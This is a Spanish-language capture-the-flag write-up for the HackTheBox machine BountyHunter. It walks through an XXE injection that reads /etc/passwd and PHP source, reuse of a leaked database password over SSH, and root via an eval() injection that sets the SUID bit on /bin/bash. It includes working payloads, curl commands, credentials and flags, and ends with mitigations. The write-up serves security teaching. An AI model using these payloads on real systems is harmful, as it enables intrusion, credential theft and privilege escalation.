---
title: "BountyHunter — HackTheBox (Easy)"
machine: "BountyHunter"
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
tags: ["RCE", "XXE", "Privesc", "Web"]
retired: true
summary: "BountyHunter es una máquina Linux de dificultad Easy en HackTheBox. Presenta una aplicación web de reporte de bug bounties que es vulnerable a XML External Enti"
draft: false
---
---

## Índice

---

## Descripción General

**BountyHunter** es una máquina Linux de dificultad **Easy** en HackTheBox. Presenta una aplicación web de reporte de bug bounties que es vulnerable a **XML External Entity Injection (XXE)**. La explotación de esta vulnerabilidad permite leer archivos internos del servidor, incluyendo credenciales de base de datos que se reutilizan para acceso SSH. La escalada de privilegios se logra abusando de un script Python ejecutado como `root` via `sudo`, el cual contiene una llamada insegura a `eval()` que permite inyección de código arbitrario.

**Tecnologías clave:** Apache 2.4.41, PHP, jQuery, XML, Python 3.8, sudo

---

## Reconocimiento

### nmap

```jsx
❯ sudo nmap 10.129.35.23 -p 22,80 -sCV -Pn -oN targeted
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-19 07:09 -0400
Nmap scan report for 10.129.35.23
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.85 seconds
❯ echo "10.129.35.23 BountyHunter.htb" | sudo tee -a /etc/hosts
10.129.35.23 BountyHunter.htb
```

### Escaneo con WhatWeb

```
http://10.129.35.23/ [200 OK]
Apache[2.4.41], Bootstrap, HTML5
HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]
JQuery, Script, Title[Bounty Hunters]
```

El servidor corre **Apache 2.4.41** sobre **Ubuntu Linux**. La presencia de PHP se infiere por el archivo `portal.php` enlazado en la navegación.

### Enumeración de la Aplicación

La página principal (`index.html`) expone en su navbar un enlace a `portal.php`. El footer menciona un sistema de tracking de bug bounties "próximamente", lo que actúa como pista temática.

---

## Análisis de la Aplicación Web

El portal de reportes (`portal.php`) carga el script `/resources/bountylog.js`, el cual contiene la lógica del formulario.

### Lectura de bountylog.js

```bash
curl http://10.129.35.23/resources/bountylog.js
```

**Contenido relevante:**

```jsx
function returnSecret(data) {
    return Promise.resolve($.ajax({
        type: "POST",
        data: {"data": data},
        url: "tracker_diRbPr00f314.php"
    }));
}

async function bountySubmit() {
    var xml = `<?xml version="1.0" encoding="ISO-8859-1"?>
    <bugreport>
        <title>${$('#exploitTitle').val()}</title>
        <cwe>${$('#cwe').val()}</cwe>
        <cvss>${$('#cvss').val()}</cvss>
        <reward>${$('#reward').val()}</reward>
    </bugreport>`
    let data = await returnSecret(btoa(xml));
    $("#return").html(data)
}
```

### Hallazgos Clave

| Campo | Valor |
| --- | --- |
| Endpoint receptor | `tracker_diRbPr00f314.php` |
| Método | POST |
| Parámetro | `data` |
| Encoding | Base64 (`btoa()`) |
| Formato del body | XML |

El script construye un documento XML con los valores del formulario y lo **codifica en Base64** antes de enviarlo. El backend parsea el XML — vector clásico de **XXE Injection**.

---

## Explotación — XXE Injection

### Verificación con /etc/passwd

```bash
# 1. Crear el payload XML con entidad externa
cat > /tmp/xxe.xml << 'EOF'
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<bugreport>
<title>&xxe;</title>
<cwe>1</cwe>
<cvss>1</cvss>
<reward>1</reward>
</bugreport>
EOF

# 2. Codificar en base64 y enviar
B64=$(base64 -w 0 /tmp/xxe.xml)
curl -s -X POST http://10.129.35.23/tracker_diRbPr00f314.php \
  --data-urlencode "data=$B64"
```

> ⚠️ **Nota:** Es crítico usar `--data-urlencode` en lugar de `-d` para evitar que el `&` del nombre de entidad (`&xxe;`) sea interpretado como separador de parámetros POST.
> 

### Resultado — Usuarios con shell

Del contenido de `/etc/passwd`, los únicos usuarios con `/bin/bash` son:

```
root:x:0:0:root:/root:/bin/bash
development:x:1000:1000:Development:/home/development:/bin/bash
```

**Usuario objetivo:** `development`

---

## Lectura de Archivos con PHP Filter Wrapper

Intentar leer directamente un archivo `.php` devolvería contenido vacío porque el servidor lo ejecutaría antes de devolverlo. Se usa el **PHP filter wrapper** para obtener el contenido codificado en Base64:

```bash
cat > /tmp/xxe.xml << 'EOF'
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">]>
<bugreport>
<title>&xxe;</title>
<cwe>1</cwe>
<cvss>1</cvss>
<reward>1</reward>
</bugreport>
EOF

B64=$(base64 -w 0 /tmp/xxe.xml)
curl -s -X POST http://10.129.35.23/tracker_diRbPr00f314.php \
  --data-urlencode "data=$B64"
```

La respuesta devuelve el contenido de `db.php` en Base64. Decodificando:

```bash
echo "PD9waHAK..." | base64 -d
```

**Contenido de db.php:**

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

---

## Acceso Inicial via SSH

Las credenciales de la base de datos están **reutilizadas** para el usuario del sistema:

```bash
ssh development@10.129.35.23
# Password: m19RoAU0hP41A1sTsq6K
```

Acceso exitoso como `development`.

---

## Flag de Usuario

```bash
development@bountyhunter:~$ cat user.txt
403b2fe4cf9343950bb2576db4dcf31d
```

El directorio home también contiene `contract.txt`, una nota de "John" mencionando una **herramienta interna de Skytrain Inc** con tickets de validación — pista para la escalada de privilegios.

---

## Escalada de Privilegios

### Enumeración de sudo

```bash
sudo -l
```

```
User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

`development` puede ejecutar el script `ticketValidator.py` como `root` sin contraseña.

### Análisis del Script Vulnerable

```python
def evaluate(ticketFile):
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            continue
        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue
        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))  # ← VULNERABLE
```

**Vulnerabilidad:** La función `eval()` en la línea marcada evalúa directamente el contenido de la línea del ticket sin sanitización. Solo se valida que el primer número cumpla `% 7 == 4` (ej: 4, 11, 18...). Todo lo que se inyecte **después del `+`** también es evaluado.

### Craft del Ticket Malicioso

```bash
cat > /tmp/evil.md << 'EOF'
# Skytrain Inc
## Ticket to root
__Ticket Code:__
**4+__import__('os').system('chmod +s /bin/bash')**
EOF
```

**Estructura del payload:**

- `4` → cumple `4 % 7 == 4` ✓
- `+` → concatenación aritmética (bypass de la validación)
- `__import__('os').system('chmod +s /bin/bash')` → inyección de código Python

### Ejecución

```bash
echo "/tmp/evil.md" | sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Verificar el bit SUID:

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

Escalar a root:

```bash
/bin/bash -p
whoami  # root
```

---

## Flag de Root

```bash
bash-5.0# cat /root/root.txt
c4ab928d54255eefb1e9612b5108ef32
```

---

## Resumen de la Cadena de Ataque

```
┌─────────────────────────────────────────────────────────────┐
│             BOUNTYHUNTER — Cadena de Ataque                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  bountylog.js ──► XML en Base64 ──► tracker_diRbPr00f314   │
│                                            │                │
│                                            ▼                │
│                              XXE Injection (file://)        │
│                                            │                │
│                                            ▼                │
│                    /etc/passwd ──► usuario: development     │
│                                            │                │
│                                            ▼                │
│            php://filter wrapper ──► db.php en Base64        │
│                                            │                │
│                                            ▼                │
│              Credenciales: m19RoAU0hP41A1sTsq6K             │
│                                            │                │
│                                            ▼                │
│            SSH como development ──────► user.txt ✓          │
│                                            │                │
│                                            ▼                │
│         sudo -l ──► ticketValidator.py (NOPASSWD root)      │
│                                            │                │
│                                            ▼                │
│          eval() sin sanitizar ──► SUID en /bin/bash         │
│                                            │                │
│                                            ▼                │
│                    bash -p ───────────► root.txt ✓          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Lecciones Aprendidas

| Vulnerabilidad | Causa Raíz | Mitigación |
| --- | --- | --- |
| XXE Injection | Parser XML sin `LIBXML_NOENT` deshabilitado | Deshabilitar entidades externas en el parser |
| PHP filter wrapper | Exposición del sistema de archivos via XXE | Mismo fix que XXE |
| Reutilización de credenciales | Password de DB == password de sistema | Usar credenciales independientes por servicio |
| `eval()` inseguro | Input de archivo no sanitizado antes de `eval()` | Nunca usar `eval()` con datos no confiables; usar `ast.literal_eval()` para expresiones simples |

---

## Herramientas Utilizadas

- `whatweb` — Fingerprinting de tecnologías web
- `curl` — Interacción con endpoints HTTP
- `base64` — Encoding/decoding de payloads
- Burp Suite — Análisis del tráfico del formulario
- `ssh` — Acceso remoto al sistema

---

*Writeup por —* **4Pr3nd1z mayo 2026**
